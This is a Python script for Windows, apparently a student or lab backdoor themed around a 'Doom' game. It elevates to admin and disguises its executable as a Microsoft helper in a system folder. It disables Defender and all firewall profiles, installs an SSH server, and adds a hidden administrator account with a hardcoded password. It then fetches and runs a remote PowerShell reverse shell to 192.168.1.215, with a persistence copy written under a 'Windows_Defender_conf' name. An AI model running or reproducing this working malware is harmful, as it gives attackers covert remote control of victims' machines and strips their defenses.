#!/usr/bin/env python3
#                                                                        6               EEEEEEEEEEE      X     X     EEEEEEEEEEE   
#  ||0@#@         .O0O0.       .O0O0.         X         A               5                D                 X   X      D 
#  ||    X       0      O     0      O       X  X      Z Q             5   7             D                  X X       D
#  ||     @      O      0     O      0      X    F    F   A           5    5             DXXXXXXXXX          X        DFFFFFFFFFF
#  ||      @     0      O     0      O     F      B  X     K          567746721          D                  X X       D
#  ||      @     O      0     0      0    X       X X       K              8      @@     D                 X   X      D
#  ||     O       .O0O0.       .0O0O.    M         X         Z             6      @@     DVVVVVVVVVV      X     X     DXXXXXXXXXX
#  ||#@@@
#            ,-~¨^  ^¨-,           _,
#           /          / ;^-._...,¨/
#          /          / /         /
#         /          / /         /
#        /          / /         /
#       /,.-:''-,_ / /         /
#       _,.-:--._ ^ ^:-._ __../
#     /^         / /¨:.._¨__.;
#    /          / /      ^  /
#   /          / /         /
#  /          / /         /      
# /_,.--:^-._/ /         /        
#^            ^¨¨-.___.:^
#--------------------------------------------#
import sys,ctypes,os,subprocess,time,winreg,threading
import sysconfig,sched,math,shutil,os.path,socket,logging
from sys import exit
import subprocess as sub
from winreg import *
#--------------------------------------------#
#if threading.active_count() >= 0:
#    time.sleep(60)
#--------------------------------------------#
if not ctypes.windll.shell32.IsUserAnAdmin():
    print('Not enough priviledge, to install dependencies')
    ctypes.windll.shell32.ShellExecuteW(
        None, 'runas', sys.executable, ' '.join(sys.argv), None, None)
    exit(0)
else:
    print('ElevatedPrivilegesAcquired,InstallingDependencies')
#--------------------------------------------#
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","New-Item Windows_Defender_conf.ps1"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Set-Content Windows_Defender_conf.ps1 'powershell.exe -nop -w hidden -noni -c \"IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.215 80\"'"])
src_path = r"Windows_Defender_conf.ps1"
dst_path = r"C:\Users\johnwu\AppData\Roaming\Microsoft\Windows"
shutil.move(src_path, dst_path)
#--------------------------------------------#
#subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12"])
#subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Invoke-WebRequest -Uri \"https://www.python.org/ftp/python/3.7.0/python-3.7.0.exe\" -OutFile \"c:/temp/python-3.7.0.exe\""])
#subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","c:/temp/python-3.7.0.exe /quiet InstallAllUsers=0 PrependPath=1 Include_test=0"])
#--------------------------------------------#
print("WelcomeToDoom4!!!!!!!!")
victim_username = os.getenv('username')
ssh_username = "defaultuser"
ssh_passwds = "PassW0rd1@"
print("InformationGathered")
#--------------------------------------------#
print("LetMeDuplicateAndHide")
print("5BrowniePointsIfYouFindMe")
try:
    os.rename('DOOM.exe', 'MicrosoftWebHelper.exe')
    src_path = r"MicrosoftWebHelper.exe"
    dst_path = r"C:\Windows\appcompat\appraiser\Telemetry"
    shutil.move(src_path, dst_path)
except FileNotFoundError:
    print("NoWorries")
#--------------------------------------------#
print("JustAdjustingAFewSettingsSitTight")
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Add-WindowsCapability -Online -Name OpenSSH.Server~~~~0.0.1.0"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Set-Service -Name sshd -StartupType 'Automatic'"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Start-Service sshd"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Set-MpPreference -DisableRealtimeMonitoring $true"])
print("SettingsAdjusted")
#--------------------------------------------#
print("Hey!GiveMeSomeSpaceOnYourOperatingSystem")
command = """
$nusnm = """ + '"{}"'.format(ssh_username) + """ 
$nuspss = ConvertTo-SecureString """ + '"{}"'.format(ssh_passwds) + """ -AsPlainText -Force
New-LocalUser -Name $nusnm -Password $nuspss
Add-LocalGroupMember -Group "Administrators" -Member $nusnm
Get-LocalUser
"""
print(command)
exec = sub.Popen(["powershell","& {" + command + "}"])
#--------------------------------------------#
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","New-NetFirewallRule -DisplayName \"SecureShellHost\" -Direction Outbound -LocalPort 22 -Protocol TCP -Action Allow"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","New-NetFirewallRule -DisplayName \"SecureShellHost\" -Direction Inbound -LocalPort 22 -Protocol TCP -Action Allow"])
#--------------------------------------------#
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Set-NetFirewallProfile -Profile Domain, Public, Private -Enabled False"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","Reg Add \"HKLM\software\policies\microsoft\windows defender\" /v DisableAntiSpyware /t REG_DWORD /d 1 /f"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","New-NetFirewallRule -DisplayName \"Core-Networking\" -Direction Outbound -LocalPort 80 -Protocol TCP -Action Allow"])
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","New-NetFirewallRule -DisplayName \"Core-Networking\" -Direction Inbound -LocalPort 80 -Protocol TCP -Action Allow"])
#--------------------------------------------#
subprocess.call(["C:\\WINDOWS\\system32\\WindowsPowerShell\\v1.0\\powershell.exe","powershell.exe -nop -w hidden -noni -c 'IEX(IWR https://raw.githubusercontent.com/antonioCoco/ConPtyShell/master/Invoke-ConPtyShell.ps1 -UseBasicParsing); Invoke-ConPtyShell 192.168.1.215 80'"])
print("DontWorryPersistenceIsIncluded")
#--------------------------------------------#

